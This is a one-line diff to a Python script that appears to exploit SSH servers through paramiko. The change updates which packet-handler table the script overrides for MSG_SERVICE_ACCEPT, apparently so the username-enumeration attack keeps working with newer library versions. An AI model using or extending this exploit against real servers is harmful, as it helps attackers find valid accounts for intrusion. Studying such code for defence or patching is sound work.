@@ -15,7 +15,7 @@ global hostname, username, port, password_file
 
 def exploit(hostname, username, port, validuser = ""):
     # store function we will overwrite to Recveived MSG_SERVICE_ACCEPT Packets
-    old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+    old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
 
 
     # list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target
